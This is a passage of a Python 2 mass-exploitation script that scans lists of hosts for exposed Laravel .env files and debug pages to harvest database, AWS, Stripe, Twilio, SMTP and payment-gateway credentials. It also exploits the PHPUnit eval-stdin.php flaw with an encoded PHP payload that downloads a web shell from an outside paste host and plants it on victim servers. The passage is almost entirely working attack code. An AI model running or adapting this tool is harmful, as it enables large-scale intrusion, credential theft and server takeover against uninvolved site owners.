			os.system("title "+ "DB: {}, DOSpace: {}, RtPlaid: {}, Pusher: {}, SSLCZ: {}, PayStack: {}, InstaMojo: {}, PayTM: {}, Stripe: {}, Nexmo: {}, Twilio: {}, MailChimp: {}, SMTP: {}, AWS_KEY: {}, Cpanel: {}, Root: {}, Reseller: {}, Shells: {}".format(TOTAL_DB, TOTAL_DO_SPACES, TOTAL_RT_PLAID, TOTAL_PUSHER, TOTAL_SSLCZ_STORE, TOTAL_PAYSTACK, TOTAL_INSTAMOJO, TOTAL_PAYTM, TOTAL_STRIPE, TOTAL_NEXMO, TOTAL_TWILIO, TOTAL_MAILCHIMP, TOTAL_SMTP, TOTAL_AWS_KEY, TOTAL_CP, TOTAL_ROOT, TOTAL_RS, TOTAL_SHELLS))
	# ////////////////////////////////////////////////////////////////
	# ////////////////////////////////////////////////////////////////


def GET_SHELL(domain):
	global TOTAL_SHELLS
	url = "http://" + domain +"/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
	try:
		#data2 = "<?php eval('?>'.base64_decode('PD9waHAKZnVuY3Rpb24gYWRtaW5lcigkdXJsLCAkaXNpKSB7CgkkZnAgPSBmb3BlbigkaXNpLCAidyIpOwoJJGNoID0gY3VybF9pbml0KCk7CgljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVJMLCAkdXJsKTsKCWN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9CSU5BUllUUkFOU0ZFUiwgdHJ1ZSk7CgljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIHRydWUpOwoJY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1NTTF9WRVJJRllQRUVSLCBmYWxzZSk7CgljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfRklMRSwgJGZwKTsKCXJldHVybiBjdXJsX2V4ZWMoJGNoKTsKCWN1cmxfY2xvc2UoJGNoKTsKCWZjbG9zZSgkZnApOwoJb2JfZmx1c2goKTsKCWZsdXNoKCk7Cn0KaWYoYWRtaW5lcigiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2JvdGVycy9XRUJTSEVMTC9tYXN0ZXIvdXB4LnR4dCIsImFzLnBocCIpKSB7CgllY2hvICJTdWtzZXMiOwp9IGVsc2UgewoJZWNobyAiZmFpbCI7Cn0KPz4=')); ?>"
		cmd1 = "<?php eval('?>'.base64_decode('PD9waHAKZnVuY3Rpb24gYWRtaW5lcigkdXJsLCAkaXNpKSB7CgkkZnAgPSBmb3BlbigkaXNpLCAidyIpOwoJJGNoID0gY3VybF9pbml0KCk7CgljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVJMLCAkdXJsKTsKCWN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9CSU5BUllUUkFOU0ZFUiwgdHJ1ZSk7CgljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIHRydWUpOwoJY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1NTTF9WRVJJRllQRUVSLCBmYWxzZSk7CgljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfRklMRSwgJGZwKTsKCXJldHVybiBjdXJsX2V4ZWMoJGNoKTsKCWN1cmxfY2xvc2UoJGNoKTsKCWZjbG9zZSgkZnApOwoJb2JfZmx1c2goKTsKCWZsdXNoKCk7Cn0KaWYoYWRtaW5lcigiaHR0cHM6Ly9wYXN0ZWJpbi5wbC92aWV3L3Jhdy83ZDM4N2YxZSIsIkJ1Z3oucGhwIikpIHsKCWVjaG8gIlN1a3Nlc2dibGsiOwp9IGVsc2UgewoJZWNobyAiZmFpbCI7Cn0KPz4=')); ?>"
		see = requests.session()
		Agent4 = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
		ktn4 = see.get(url, headers=Agent4, data=cmd1, verify=False, timeout=8)
		shell_path = url.replace('eval-stdin.php', 'Bugz.php')
		if 'Suksesgblk' in ktn4.text:
			save = open('Rzlts/Shell.txt', 'a')
			save.write(str(shell_path)+'\n')
			save.close()
			TOTAL_SHELLS+=1
			os.system("title "+ "DB: {}, DOSpace: {}, RtPlaid: {}, Pusher: {}, SSLCZ: {}, PayStack: {}, InstaMojo: {}, PayTM: {}, Stripe: {}, Nexmo: {}, Twilio: {}, MailChimp: {}, SMTP: {}, AWS_KEY: {}, Cpanel: {}, Root: {}, Reseller: {}, Shells: {}".format(TOTAL_DB, TOTAL_DO_SPACES, TOTAL_RT_PLAID, TOTAL_PUSHER, TOTAL_SSLCZ_STORE, TOTAL_PAYSTACK, TOTAL_INSTAMOJO, TOTAL_PAYTM, TOTAL_STRIPE, TOTAL_NEXMO, TOTAL_TWILIO, TOTAL_MAILCHIMP, TOTAL_SMTP, TOTAL_AWS_KEY, TOTAL_CP, TOTAL_ROOT, TOTAL_RS, TOTAL_SHELLS))
			sds = "SHELL"
			return sds
		else:
			sdsx = "SHELL"
			return sdsx
	except Exception as e:
		sdsx = "SHELL"
		return str(sdsx)
	# ////////////////////////////////////////////////////////////////
	# ////////////////////////////////////////////////////////////////


# ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
# ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
# ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

def CHECK(IP_):
	#global URL_

	headers = {'User-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'}
	ENV_URLS = ["http://IP_/.env", "https://IP_/.env"]
	DEBUG_URLS = ["http://IP_", "https://IP_"]
	METHOD_ = ""
	URL_ = ""
	SRC_ = ""

	#URL_ = "http://{}".format(IP_)
	try:
		for URL__ in ENV_URLS:
			URL_ = URL__.replace("IP_", IP_)
			r = requests.get(URL_, headers=headers, timeout=4, verify=False, allow_redirects=False) # /.env
			if "APP_NAME=" in r.content or "APP_ENV=" in r.content or "APP_DEBUG=" in r.content or "APP_NAME =" in r.content or "APP_ENV =" in r.content or "APP_DEBUG =" in r.content:
				METHOD_ = "[/.ENV]"
				SRC_ = r.content
				break
			else:
				pass
		if METHOD_ == "":
			for URL__ in DEBUG_URLS:
				URL_ = URL__.replace("IP_", IP_)
				R = requests.post(URL_, data={"0x[]":"R3ppy"}, headers=headers, timeout=4, verify=False, allow_redirects=False)
				if "<td>APP_NAME</td>" in R.content or "<td>APP_ENV</td>" in R.content or "<td>APP_DEBUG</td>" in R.content or "<td>REMOTE_PORT</td>" in R.content:
					METHOD_ = "[DEBUG]"
					SRC_ = R.content
					break
				else:
					pass
		else:
			pass
	except:
		pass

	# print METHOD_
	# print URL_
	# print SRC_

	# // print SRC_
	if METHOD_ != "":
		#if "APP_NAME=" in r.content: METHOD_ = "[/.ENV]"; SRC_ = r.content
		#if "<td>APP_NAME</td>" in R.content: METHOD_ = "[DEBUG]"; SRC_ = R.content
		print "%s%s{}%s".format(IP_) % (fg(15), bg(0), attr(0)) + "%s%s {}%s".format(METHOD_) % (fg(70), bg(0), attr(0))
		GET_DB(IP_, SRC_, URL_, METHOD_)
		GET_DO_SPACES(SRC_, URL_, METHOD_)
		GET_RT_PLAID(SRC_, URL_, METHOD_)
		GET_SSLCZ_STORE(SRC_, URL_, METHOD_)
		GET_INSTAMOJO(SRC_, URL_, METHOD_)
		GET_PUSHER(SRC_, URL_, METHOD_)
		GET_MAILCHIMP(SRC_, URL_, METHOD_)
		GET_PAYTM(SRC_, URL_, METHOD_)
		GET_PAYSTACK(SRC_, URL_, METHOD_)
		GET_STRIPE(SRC_, URL_, METHOD_)
		GET_TWILIO(SRC_, URL_, METHOD_)
		GET_NEXMO(SRC_, URL_, METHOD_)
		GET_AWS_KEY(SRC_, URL_, METHOD_)
		GET_SMTP(SRC_, URL_, METHOD_)
	else:
		print "%s%s{}%s".format(IP_) % (fg(15), bg(0), attr(0)) + "%s%s [/.ENV] [DEBUG]%s" % (fg(160), bg(0), attr(0))
	GET_SHELL(IP_)


XINO = open(raw_input("Domains/IPS ? "), "r").read().split("\n")

#for Q8 in XINO:
#	CHECK(Q8)

if __name__ == '__main__':
	pool = ThreadPool(500)
	for _ in pool.imap_unordered(CHECK, XINO):
		pass
